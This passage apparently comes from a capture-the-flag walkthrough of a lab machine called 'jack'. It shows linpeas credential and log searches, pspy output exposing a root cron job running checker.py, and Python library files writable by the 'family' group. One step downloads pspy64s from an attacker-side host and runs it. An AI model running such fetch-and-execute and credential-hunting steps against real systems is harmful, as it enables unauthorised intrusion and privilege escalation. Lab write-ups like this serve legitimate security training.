@@ -2260,3 +2260,1135 @@ drwxr-xr-x  3 root     root     4.0K Jan  9  2020 ..
 		$pwd    = trim( wp_unslash( $_POST['pwd'] ) );
 
 ╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/bin/systemd-ask-password
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/home/jack/.config/lxc/client.key
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/share/dns/root.key
+/usr/share/doc/git/contrib/credential
+/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
+/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
+/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
+/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
+/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
+/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
+/usr/share/man/man1/git-credential.1.gz
+/usr/share/man/man1/git-credential-cache.1.gz
+/usr/share/man/man1/git-credential-cache--daemon.1.gz
+/usr/share/man/man1/git-credential-store.1.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/man/man7/gitcredentials.7.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/pam/common-password.md5sums
+/var/cache/debconf/passwords.dat
+/var/lib/pam/password
+/var/www/html/wp-admin/js/password-strength-meter.js
+/var/www/html/wp-admin/js/password-strength-meter.min.js
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+ configure base-passwd:amd64 3.5.39 3.5.39
+ install base-passwd:amd64 <none> 3.5.39
+ status half-configured base-passwd:amd64 3.5.39
+ status half-installed base-passwd:amd64 3.5.39
+ status installed base-passwd:amd64 3.5.39
+ status unpacked base-passwd:amd64 3.5.39
+ status half-configured base-passwd:amd64 3.5.39
+ status half-installed base-passwd:amd64 3.5.39
+ status unpacked base-passwd:amd64 3.5.39
+ upgrade base-passwd:amd64 3.5.39 3.5.39
+ install passwd:amd64 <none> 1:4.2-3.1ubuntu5
+ status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+ configure base-passwd:amd64 3.5.39 <none>
+ status half-configured base-passwd:amd64 3.5.39
+ status installed base-passwd:amd64 3.5.39
+ status unpacked base-passwd:amd64 3.5.39
+ configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
+ status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+ status installed passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+ status half-configured passwd:amd64 1:4.2-3.1ubuntu5
+ status half-installed passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
+ upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
+ configure passwd:amd64 1:4.2-3.1ubuntu5.3 <none>
+ status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
+ status installed passwd:amd64 1:4.2-3.1ubuntu5.3
+ status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
+ base-passwd depends on libc6 (>= 2.8); however:
+ base-passwd depends on libdebconfclient0 (>= 0.145); however:
+Binary file /var/log/auth.log matches
+Binary file /var/log/syslog matches
+Description: Set up users and passwords
+dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+Jan 10 08:05:13 jack passwd[4712]: pam_unix(passwd:chauthtok): password changed for jack
+Jan 10 08:07:47 jack passwd[4720]: pam_unix(passwd:chauthtok): password changed for root
+Jan 10 08:13:51 jack gpasswd[4787]: user jack removed by root from group lxd
+Jan 10 09:00:20 jack gpasswd[4851]: user jack removed by root from group sudo
+Jan 10 09:28:43 jack sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=list
+Jan 10 09:29:00 jack sudo:     jack : command not allowed ; TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=list
+Jan 10 14:57:46 jack systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Jan  8 11:23:39 jack systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Jan  9 09:57:08 jack sshd[1513]: Accepted password for jack from 192.168.1.137 port 52860 ssh2
+Jan  9 09:57:22 jack sudo:     jack : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=/bin/bash
+Jan  9 09:57:40 jack sudo:     jack : TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=/bin/bash
+Jan  9 10:10:47 jack sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install apache2 libapache2-mod-php7.0 -y
+Jan  9 10:11:35 jack chage[9952]: changed password expiry for mysql
+Jan  9 10:16:53 jack sudo:     root : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/sbin/a2enmod rewrite
+Jan  9 10:22:24 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chown -R www-data:www-data /var/www/html/octobercms/
+Jan  9 10:22:28 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod -R 755 /var/www/html/
+Jan  9 10:22:32 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 10:22:47 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/a2ensite octobercms
+Jan  9 10:22:52 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/systemctl restart apache2
+Jan  9 10:23:20 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 10:23:47 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/systemctl restart apache2
+Jan  9 10:25:41 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 10:26:04 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 10:28:57 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 10:29:41 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 10:29:56 jack sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nano /etc/apache2/sites-available/octobercms.conf
+Jan  9 13:22:40 jack systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+Jan  9 13:23:50 jack sshd[1630]: Accepted password for jack from 192.168.1.137 port 53030 ssh2
+Jan  9 13:23:54 jack sudo:     jack : TTY=pts/0 ; PWD=/home/jack ; USER=root ; COMMAND=/bin/bash
+Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
+Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
+Selecting previously unselected package base-passwd.
+Selecting previously unselected package passwd.
+Setting up base-passwd (3.5.39) ...
+
+ack@jack:/tmp$ wget http://10.8.19.103:8000/pspy64s
+--  http://10.8.19.103:8000/pspy64s
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1156536 (1.1M) [application/octet-stream]
+Saving to: ‘pspy64s’
+
+pspy64s                        100%[====================================================>]   1.10M   609KB/s    in 1.9s    
+
+(609 KB/s) - ‘pspy64s’ saved [1156536/1156536]
+
+jack@jack:/tmp$ chmod +x pspy64s; ./pspy64s
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+ CMD: UID=0    PID=959    | /sbin/iscsid 
+ CMD: UID=0    PID=958    | /sbin/iscsid 
+ CMD: UID=0    PID=954    | /usr/lib/policykit-1/polkitd --no-debug 
+ CMD: UID=0    PID=928    | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog 
+ CMD: UID=0    PID=918    | /usr/sbin/acpid 
+ CMD: UID=0    PID=913    | /usr/lib/accountsservice/accounts-daemon 
+ CMD: UID=111  PID=901    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
+ CMD: UID=0    PID=9      | 
+ CMD: UID=0    PID=892    | /usr/lib/snapd/snapd 
+ CMD: UID=108  PID=890    | /usr/sbin/rsyslogd -n 
+ CMD: UID=0    PID=882    | /usr/bin/lxcfs /var/lib/lxcfs/ 
+ CMD: UID=0    PID=879    | /lib/systemd/systemd-logind 
+ CMD: UID=0    PID=876    | /usr/sbin/atd -f 
+ CMD: UID=0    PID=865    | /usr/sbin/cron -f 
+ CMD: UID=0    PID=84     | 
+ CMD: UID=0    PID=83     | 
+ CMD: UID=0    PID=82     | 
+ CMD: UID=0    PID=8      | 
+ CMD: UID=0    PID=721    | /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
+ CMD: UID=0    PID=7      | 
+ CMD: UID=1000 PID=6905   | -bash 
+ CMD: UID=1000 PID=6904   | sshd: jack@pts/1     
+ CMD: UID=0    PID=69     | 
+ CMD: UID=0    PID=6871   | sshd: jack [priv]    
+ CMD: UID=0    PID=6795   | 
+ CMD: UID=0    PID=64     | 
+ CMD: UID=1000 PID=6202   | ./pspy64s 
+ CMD: UID=0    PID=62     | 
+ CMD: UID=0    PID=61     | 
+ CMD: UID=0    PID=60     | 
+ CMD: UID=0    PID=6      | 
+ CMD: UID=0    PID=59     | 
+ CMD: UID=0    PID=58     | 
+ CMD: UID=0    PID=57     | 
+ CMD: UID=0    PID=56     | 
+ CMD: UID=0    PID=55     | 
+ CMD: UID=0    PID=54     | 
+ CMD: UID=0    PID=53     | 
+ CMD: UID=0    PID=52     | 
+ CMD: UID=0    PID=51     | 
+ CMD: UID=0    PID=50     | 
+ CMD: UID=0    PID=5      | 
+ CMD: UID=0    PID=49     | 
+ CMD: UID=102  PID=476    | /lib/systemd/systemd-timesyncd 
+ CMD: UID=0    PID=438    | /lib/systemd/systemd-udevd 
+ CMD: UID=0    PID=4      | 
+ CMD: UID=0    PID=397    | /sbin/lvmetad -f 
+ CMD: UID=0    PID=394    | 
+ CMD: UID=0    PID=393    | 
+ CMD: UID=0    PID=392    | 
+ CMD: UID=0    PID=391    | 
+ CMD: UID=0    PID=390    | 
+ CMD: UID=0    PID=386    | 
+ CMD: UID=0    PID=373    | 
+ CMD: UID=0    PID=372    | 
+ CMD: UID=0    PID=355    | /lib/systemd/systemd-journald 
+ CMD: UID=0    PID=33     | 
+ CMD: UID=0    PID=32     | 
+ CMD: UID=0    PID=31     | 
+ CMD: UID=0    PID=30     | 
+ CMD: UID=0    PID=3      | 
+ CMD: UID=0    PID=288    | 
+ CMD: UID=0    PID=287    | 
+ CMD: UID=0    PID=27     | 
+ CMD: UID=0    PID=263    | 
+ CMD: UID=0    PID=26     | 
+ CMD: UID=0    PID=25     | 
+ CMD: UID=0    PID=247    | 
+ CMD: UID=0    PID=24     | 
+ CMD: UID=0    PID=232    | 
+ CMD: UID=0    PID=23     | 
+ CMD: UID=0    PID=22     | 
+ CMD: UID=0    PID=21     | 
+ CMD: UID=0    PID=20242  | 
+ CMD: UID=0    PID=20     | 
+ CMD: UID=0    PID=2      | 
+ CMD: UID=0    PID=19     | 
+ CMD: UID=0    PID=18     | 
+ CMD: UID=0    PID=17     | 
+ CMD: UID=0    PID=160    | 
+ CMD: UID=1000 PID=1527   | -bash 
+ CMD: UID=1000 PID=1526   | sshd: jack@pts/0     
+ CMD: UID=0    PID=15     | 
+ CMD: UID=1000 PID=1466   | (sd-pam)   
+ CMD: UID=1000 PID=1464   | /lib/systemd/systemd --user 
+ CMD: UID=0    PID=1462   | sshd: jack [priv]    
+ CMD: UID=33   PID=1458   | /usr/sbin/apache2 -k start 
+ CMD: UID=0    PID=14     | 
+ CMD: UID=33   PID=1357   | /usr/sbin/apache2 -k start 
+ CMD: UID=33   PID=1356   | /usr/sbin/apache2 -k start 
+ CMD: UID=33   PID=1355   | /usr/sbin/apache2 -k start 
+ CMD: UID=33   PID=1354   | /usr/sbin/apache2 -k start 
+ CMD: UID=33   PID=1353   | /usr/sbin/apache2 -k start 
+ CMD: UID=0    PID=130    | 
+ CMD: UID=0    PID=13     | 
+ CMD: UID=0    PID=129    | 
+ CMD: UID=0    PID=1284   | logger -t mysqld -p daemon error 
+ CMD: UID=118  PID=1283   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306 
+ CMD: UID=0    PID=128    | 
+ CMD: UID=0    PID=127    | 
+ CMD: UID=0    PID=126    | 
+ CMD: UID=0    PID=125    | 
+ CMD: UID=0    PID=124    | 
+ CMD: UID=0    PID=123    | 
+ CMD: UID=0    PID=122    | 
+ CMD: UID=0    PID=12     | 
+ CMD: UID=0    PID=1197   | /usr/sbin/apache2 -k start 
+ CMD: UID=0    PID=1122   | /bin/bash /usr/bin/mysqld_safe 
+ CMD: UID=0    PID=11     | 
+ CMD: UID=0    PID=1060   | /sbin/agetty --noclear tty1 linux 
+ CMD: UID=0    PID=1057   | /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220 
+ CMD: UID=0    PID=1005   | /usr/sbin/sshd -D 
+ CMD: UID=0    PID=10     | 
+ CMD: UID=0    PID=1      | /sbin/init 
+ CMD: UID=0    PID=6214   | /usr/sbin/CRON -f 
+ CMD: UID=0    PID=6216   | /usr/bin/python /opt/statuscheck/checker.py 
+ CMD: UID=0    PID=6215   | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
+ CMD: UID=0    PID=6218   | /usr/bin/curl -s -I http://127.0.0.1 
+ CMD: UID=0    PID=6217   | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 
+
+jack@jack:/tmp$ cd /opt/statuscheck/
+jack@jack:/opt/statuscheck$ ls
+checker.py  output.log
+jack@jack:/opt/statuscheck$ cat checker.py 
+import os
+
+os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
+jack@jack:/opt/statuscheck$ cat output.log 
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:44:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:46:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:48:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:50:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:52:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:54:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:56:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 00:58:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:00:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:02:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:04:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:06:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:08:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:10:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:12:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:14:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:16:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:18:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:20:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Sat, 11 Jan 2020 01:22:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 13 Jan 2020 19:12:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:28:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:30:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:32:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:34:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:36:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:38:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:40:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:42:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Mon, 16 Nov 2020 20:44:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 20:50:04 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 20:52:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 20:54:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 20:56:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 20:58:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:00:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:02:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:04:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:06:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:08:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:10:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:12:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:14:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:16:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:18:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:20:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:22:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:24:01 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Wed, 18 Jan 2023 21:26:02 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Link: <http://jack.thm/index.php/wp-json/>; rel="https://api.w.org/"
+Content-Type: text/html; charset=UTF-8
+
+jack@jack:/tmp$ id
+uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
+
+jack@jack:/opt/statuscheck$ find / -group family 2>/dev/null
+/usr/lib/python2.7/_threading_local.py
+/usr/lib/python2.7/plistlib.pyc
+/usr/lib/python2.7/stringprep.py
+/usr/lib/python2.7/ihooks.pyc
+/usr/lib/python2.7/weakref.py
+/usr/lib/python2.7/sgmllib.pyc
+/usr/lib/python2.7/os.py
+/usr/lib/python2.7/posixpath.py
+/usr/lib/python2.7/copy_reg.py
+/usr/lib/python2.7/bdb.py
+/usr/lib/python2.7/smtpd.pyc
+/usr/lib/python2.7/dircache.pyc
+/usr/lib/python2.7/bisect.pyc
+/usr/lib/python2.7/fnmatch.py
+/usr/lib/python2.7/heapq.py
+/usr/lib/python2.7/struct.pyc
+/usr/lib/python2.7/fpformat.py
+/usr/lib/python2.7/hotshot
+/usr/lib/python2.7/shutil.py
+/usr/lib/python2.7/posixpath.pyc
+/usr/lib/python2.7/cmd.py
+/usr/lib/python2.7/hmac.py
+/usr/lib/python2.7/_sysconfigdata.pyc
+/usr/lib/python2.7/plistlib.py
+/usr/lib/python2.7/contextlib.py
+/usr/lib/python2.7/posixfile.pyc
+/usr/lib/python2.7/Bastion.pyc
